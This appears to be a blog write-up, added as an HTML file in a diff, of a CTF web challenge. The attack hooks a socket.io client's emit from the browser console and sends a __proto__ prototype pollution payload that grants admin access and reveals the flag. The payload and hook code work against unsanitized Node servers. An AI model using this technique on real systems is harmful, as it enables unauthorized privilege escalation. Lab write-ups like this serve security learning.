@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Ukrainian National CTF 2025 – Task 4 (WebSocket Hijacking + Prototype Pollution)</title>
+    <meta name="description" content="Writeup for Task 4 (WebSocket Hijacking + Prototype Pollution) from Ukrainian National CTF 2025 by Alexandru Hossu.">
+    <meta property="og:title" content="Task 4 – WebSocket Hijacking + Prototype Pollution" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root { --bg:#121212; --fg:#e0e0e0; --accent:#61dafb; --border:#333; --muted:#a0a0a0; }
+      * { box-sizing:border-box; }
+      body { margin:0; padding:0; background:var(--bg); color:var(--fg); font-family:'Work Sans',sans-serif; line-height:1.6; }
+      a { color:var(--accent); text-decoration:none; }
+      a:hover { text-decoration:underline; }
+      .wrapper { max-width:768px; margin:0 auto; padding:2rem 1rem 3rem; }
+      .site-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:3rem; }
+      .site-title { font-weight:700; font-size:1.5rem; color:var(--fg); }
+      .site-logo { height:48px; width:48px; border-radius:50%; object-fit:cover; }
+      .post { max-width:768px; margin:0 auto; }
+      .post-header h1 { margin:0 0 0.5rem; font-size:2rem; font-weight:500; }
+      .post-subtitle { margin:0 0 0.75rem; opacity:0.8; font-size:1rem; }
+      .post-meta { margin:0 0 1.5rem; font-size:0.9rem; color:var(--muted); display:flex; flex-wrap:wrap; gap:0.75rem; }
+      .post-tags { display:flex; flex-wrap:wrap; gap:0.4rem; margin-top:0.4rem; }
+      .tag { font-size:0.75rem; padding:0.15rem 0.5rem; border-radius:999px; border:1px solid var(--border); background:rgba(255,255,255,0.02); }
+      .post-toc { margin:2rem 0; padding:1rem 1.25rem; border-radius:0.75rem; border:1px solid var(--border); background:#181818; }
+      .post-toc-title { margin:0 0 0.5rem; font-size:0.95rem; font-weight:500; text-transform:uppercase; letter-spacing:0.06em; opacity:0.8; }
+      .post-toc ul { margin:0; padding-left:1.25rem; font-size:0.95rem; }
+      .post-toc li { margin:0.1rem 0; }
+      section + section { margin-top:2rem; }
+      h2 { font-size:1.4rem; margin-bottom:0.5rem; font-weight:500; }
+      h3 { font-size:1.15rem; margin-bottom:0.4rem; font-weight:500; }
+      p { margin:0 0 0.9rem; }
+      ul,ol { padding-left:1.25rem; margin-top:0; margin-bottom:0.9rem; }
+      code { font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; font-size:0.9rem; background:rgba(255,255,255,0.04); padding:0.15rem 0.3rem; border-radius:0.25rem; }
+      pre { margin:0 0 1.25rem; padding:0.85rem 1rem; background:#0b0b0b; border-radius:0.5rem; border:1px solid #1f1f1f; overflow-x:auto; }
+      pre code { background:transparent; padding:0; }
+      .note { padding:0.75rem 1rem; border-radius:0.5rem; border:1px solid var(--border); background:#181818; font-size:0.92rem; margin-bottom:1rem; }
+      .back-link { margin:0 0 2rem; font-size:0.95rem; }
+      .site-footer { border-top:1px solid var(--border); margin-top:3rem; padding-top:1rem; display:flex; justify-content:space-between; align-items:center; }
+      .site-footer p { margin:0; font-size:0.9rem; opacity:0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">
+          ← <a href="idnex.html">Back to all writeups</a>
+        </p>
+
+        <header class="post-header">
+          <h1>Ukrainian National CTF 2025 – Task 4 (WebSocket Hijacking + Prototype Pollution)</h1>
+          <p class="post-subtitle">
+            socket.io chat app where you can hook the WebSocket in the browser, send a payload with
+            <code>__proto__</code>, and trick the server into treating you as admin.
+          </p>
+          <p class="post-meta">
+            <span>Category: Web</span>
+            <span>CTF: Ukrainian National CTF 2025</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">WebSocket</span>
+            <span class="tag">Prototype Pollution</span>
+            <span class="tag">Privilege Escalation</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#context">0. Context</a></li>
+            <li><a href="#recon">1. Recon & socket.io</a></li>
+            <li><a href="#hook">2. Hooking the WebSocket</a></li>
+            <li><a href="#pollution">3. Prototype pollution payload</a></li>
+            <li><a href="#admin">4. Becoming admin & getting the flag</a></li>
+          </ul>
+        </nav>
+
+        <section id="context">
+          <h2>0. Context</h2>
+          <p>
+            The app is a “SecureChat Lab” with two roles: normal users and admins. Admins have access to an
+            <code>/admin/panel</code> endpoint that contains the flag. The chat uses socket.io for WebSockets.
+          </p>
+        </section>
+
+        <section id="recon">
+          <h2>1. Recon & socket.io</h2>
+          <p>
+            After logging in as the provided user:
+          </p>
+          <pre><code>user / user123</code></pre>
+          <p>
+            the dashboard shows public and admin rooms. Trying to join the admin room gives “Access denied”.
+          </p>
+          <p>
+            In DevTools → Network → WS, there is a socket.io connection:
+          </p>
+          <pre><code>wss://task4.ctfd.net.ua/socket.io/?EIO=4&amp;transport=websocket&amp;sid=...</code></pre>
+        </section>
+
+        <section id="hook">
+          <h2>2. Hooking the WebSocket</h2>
+          <p>
+            From the browser console, I grabbed the socket.io instance and hooked <code>emit</code> to see
+            outgoing events:
+          </p>
+          <pre><code>const sock = Object.values(window).find(v =&gt; v &amp;&amp; v.emit &amp;&amp; v.on);
+const realEmit = sock.emit.bind(sock);
+
+sock.emit = function (ev, data) {
+  console.log("EMIT:", ev, data);
+  return realEmit(ev, data);
+};</code></pre>
+          <p>
+            Sending a message showed the event structure:
+          </p>
+          <pre><code>EMIT: "chat_message" { room: "public", message: "hello" }</code></pre>
+          <p>
+            So we know the event name (<code>chat_message</code>) and the base payload shape.
+          </p>
+        </section>
+
+        <section id="pollution">
+          <h2>3. Prototype pollution payload</h2>
+          <p>
+            The backend merges incoming message objects into some global state with something like
+            <code>Object.assign</code>. If we include a <code>__proto__</code> property, we can pollute
+            <code>Object.prototype</code>.
+          </p>
+          <p>
+            I sent this from the console:
+          </p>
+          <pre><code>sock.emit("chat_message", {
+  room: "public",
+  message: "pollute",
+  __proto__: {
+    role: "admin",
+    isAdmin: true
+  }
+});</code></pre>
+          <p>
+            If the server doesn’t sanitize <code>__proto__</code>, every new object created afterwards will
+            inherit <code>role: "admin"</code> and <code>isAdmin: true</code> from the polluted prototype.
+          </p>
+        </section>
+
+        <section id="admin">
+          <h2>4. Becoming admin & getting the flag</h2>
+          <p>
+            After sending the pollution payload:
+          </p>
+          <ul>
+            <li>I tried opening the admin chat room again – this time it worked.</li>
+            <li>I then browsed to <code>/admin/panel</code> in the same session.</li>
+          </ul>
+          <p>
+            The panel loaded and showed debug output confirming my polluted role, plus the flag:
+          </p>
+          <pre><code>CTF{Navchytysia_smiiatysia_z_sebe_tse_oznaka_heniia}</code></pre>
+          <p>
+            So the exploit chain is:
+          </p>
+          <ul>
+            <li>WebSocket hijacking (no strict origin / CSRF protection on socket.io).</li>
+            <li>Prototype pollution via JSON payload with <code>__proto__</code>.</li>
+            <li>Privilege escalation when the server trusts polluted objects for access control.</li>
+          </ul>
+        </section>
+      </article>
+
+      <footer class="site-footer">
+        <p>2025 © Alexandru Hossu</p>
+      </footer>
+    </div>
+  </body>
+</html>
